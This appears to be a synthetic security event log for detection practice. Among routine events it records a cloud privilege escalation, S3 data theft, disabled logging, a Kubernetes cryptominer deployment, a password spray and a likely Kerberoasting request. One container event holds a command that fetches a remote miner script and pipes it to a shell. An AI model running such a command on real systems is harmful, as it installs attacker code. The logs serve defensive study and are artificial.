{"_time": "2026-10-02T16:02:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "CreateAccessKey", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1", "requestParameters_userName": "svc-ci-deploy"}
{"_time": "2026-10-02T16:05:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "PutUserPolicy", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1", "requestParameters_policyName": "FullAdminTemp", "requestParameters_policyDocument": "Action:*,Resource:*"}
{"_time": "2026-10-02T16:06:03Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\rfischer", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T16:08:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "AttachUserPolicy", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1", "requestParameters_policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}
{"_time": "2026-10-02T16:10:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "rfischer", "src_ip": "10.10.41.27", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 105, "auth_result": "success"}
{"_time": "2026-10-02T16:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T16:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T16:12:00Z", "sourcetype": "aws:s3", "index": "cloud", "eventName": "GetObject", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "bucketName": "corp-finance-reports", "key": "2026_Q3_financials.xlsx", "bytesTransferred": 2100000}
{"_time": "2026-10-02T16:13:00Z", "sourcetype": "aws:s3", "index": "cloud", "eventName": "GetObject", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "bucketName": "corp-finance-reports", "key": "customer_pii_export.csv", "bytesTransferred": 48000000}
{"_time": "2026-10-02T16:14:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.41.27", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1395, "bytes_received": 32495}
{"_time": "2026-10-02T16:14:43Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-MKT-007", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T16:15:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "PutBucketAcl", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1", "requestParameters_bucketName": "corp-finance-reports", "requestParameters_acl": "public-read"}
{"_time": "2026-10-02T16:16:08Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T16:18:29Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4634, "TargetUserName": "kgupta", "LogonId": "0x868b8"}
{"_time": "2026-10-02T16:20:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "StopLogging", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1", "requestParameters_name": "management-events"}
{"_time": "2026-10-02T16:22:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "RunInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1", "instanceType": "g4dn.xlarge", "requestParameters_count": 4}
{"_time": "2026-10-02T16:24:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "UPDATE", "table": "audit_log", "rows_returned": 77, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T16:30:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.43.35", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 2231, "bytes_received": 46597}
{"_time": "2026-10-02T16:38:12Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T16:42:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T16:45:27Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\rfischer", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T16:48:11Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T16:49:59Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\jlopez", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T16:55:00Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T17:00:00Z", "sourcetype": "k8s_audit", "index": "cloud", "host": "k8s-node02", "verb": "create", "user": "system:serviceaccount:default:web-sa", "resource": "pods", "namespace": "prod", "status": 201, "note": "privileged:true,hostNetwork:true"}
{"_time": "2026-10-02T17:00:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.53.21", "endpoint": "/api/profile", "method": "GET", "status": 200, "response_time_ms": 275, "auth_result": "n/a"}
{"_time": "2026-10-02T17:01:00Z", "sourcetype": "docker", "index": "cloud", "host": "k8s-node02", "action": "pull", "image": "docker.io/anonxmr/kworker:latest", "status": "success"}
{"_time": "2026-10-02T17:02:00Z", "sourcetype": "docker", "index": "cloud", "host": "k8s-node02", "action": "exec", "container": "kworker-7f9c", "command": "/bin/sh -c curl http://185.220.101.44/miner.sh | sh"}
{"_time": "2026-10-02T17:02:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.59.18", "dest_ip": "140.82.112.3", "dest_port": 443, "protocol": "TCP", "bytes_sent": 9916, "bytes_received": 61634}
{"_time": "2026-10-02T17:03:00Z", "sourcetype": "k8s_audit", "index": "cloud", "host": "k8s-node02", "verb": "get", "user": "system:serviceaccount:default:web-sa", "resource": "secrets", "namespace": "kube-system", "status": 200, "note": "accessed default token + db-creds secret"}
{"_time": "2026-10-02T17:04:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 105, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T17:04:43Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T17:05:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.80.12", "dest_ip": "185.220.101.44", "dest_port": 3333, "protocol": "TCP", "bytes_sent": 1400, "bytes_received": 600}
{"_time": "2026-10-02T17:08:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "svc_backup", "src_ip": "10.10.54.99", "endpoint": "/api/notifications", "method": "GET", "status": 200, "response_time_ms": 91, "auth_result": "n/a"}
{"_time": "2026-10-02T17:13:45Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T17:15:37Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-MKT-007", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T17:24:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "rfischer", "src_ip": "10.10.69.51", "endpoint": "/api/profile", "method": "GET", "status": 200, "response_time_ms": 238, "auth_result": "n/a"}
{"_time": "2026-10-02T17:29:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "dnair", "src_ip": "10.10.41.34", "endpoint": "/api/reports/weekly", "method": "GET", "status": 200, "response_time_ms": 219, "auth_result": "n/a"}
{"_time": "2026-10-02T17:36:06Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\rfischer", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T17:36:30Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\jlopez", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T17:46:55Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-FIN-014", "EventCode": 4634, "TargetUserName": "dnair", "LogonId": "0x8c031"}
{"_time": "2026-10-02T17:49:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.55.69", "query": "npmjs.org", "answer": "13.106.152.69", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T17:51:41Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T18:06:28Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4634, "TargetUserName": "it_admin", "LogonId": "0xb5e1a"}
{"_time": "2026-10-02T18:13:04Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4634, "TargetUserName": "it_admin", "LogonId": "0xae873"}
{"_time": "2026-10-02T18:22:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.58.47", "dest_ip": "172.217.0.0", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1218, "bytes_received": 105758}
{"_time": "2026-10-02T18:23:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-web02", "event": "sshd_accepted", "user": "rfischer", "src_ip": "10.10.40.39", "method": "publickey"}
{"_time": "2026-10-02T18:27:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "UPDATE", "table": "orders", "rows_returned": 157, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T18:32:13Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-FIN-014", "EventCode": 4634, "TargetUserName": "pwong", "LogonId": "0x93dac"}
{"_time": "2026-10-02T18:35:35Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "pwong", "LogonId": "0x37b48"}
{"_time": "2026-10-02T18:35:45Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "dnair", "LogonId": "0xb158a"}
{"_time": "2026-10-02T18:38:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T18:44:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.66.90", "query": "teams.microsoft.com", "answer": "13.66.179.198", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T18:47:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "updates@zoom.us", "recipient": "jlopez@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T18:48:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.56.86", "query": "github.com", "answer": "13.66.214.50", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T18:50:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.41.54", "query": "pypi.org", "answer": "13.87.170.95", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T19:00:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "jsmith", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:01:03Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "it_admin", "LogonId": "0x38a68"}
{"_time": "2026-10-02T19:01:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mjones", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:02:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "klee", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:03:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetCallerIdentity", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T19:03:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T19:03:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "rpatel", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:04:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tbrown", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:05:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "agreen", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:06:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "swhite", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:07:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "nblack", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 401, "response_time_ms": 95, "auth_result": "failed", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:09:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "rpatel", "src_ip": "198.51.100.200", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 88, "auth_result": "success", "user_agent": "python-requests/2.31"}
{"_time": "2026-10-02T19:09:20Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "rpatel", "src_ip": "198.51.100.200", "endpoint": "/api/admin/users?role=all", "method": "GET", "status": 200, "response_time_ms": 130, "auth_result": "n/a"}
{"_time": "2026-10-02T19:10:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "rpatel", "src_ip": "198.51.100.200", "endpoint": "/api/invoices/8841/export", "method": "GET", "status": 200, "response_time_ms": 610, "auth_result": "n/a"}
{"_time": "2026-10-02T19:26:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "no-reply@github.com", "recipient": "asmith@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T19:27:22Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.63.50", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4389}
{"_time": "2026-10-02T19:28:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T19:44:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.68.45", "query": "pypi.org", "answer": "13.60.133.243", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T19:47:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "sessions", "rows_returned": 113, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T19:50:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "inventory", "rows_returned": 199, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T19:52:46Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.68.74", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4688}
{"_time": "2026-10-02T19:55:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.52.89", "dest_ip": "140.82.112.3", "dest_port": 443, "protocol": "TCP", "bytes_sent": 16807, "bytes_received": 39517}
{"_time": "2026-10-02T19:56:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-web02", "event": "sshd_accepted", "user": "kgupta", "src_ip": "10.10.44.17", "method": "publickey"}
{"_time": "2026-10-02T20:00:00Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4769, "TargetUserName": "helpdesk_tmp", "ServiceName": "MSSQLSvc/sqlsrv01", "IpAddress": "10.10.30.25", "TicketEncryptionType": "0x17", "ResultCode": "0x0"}
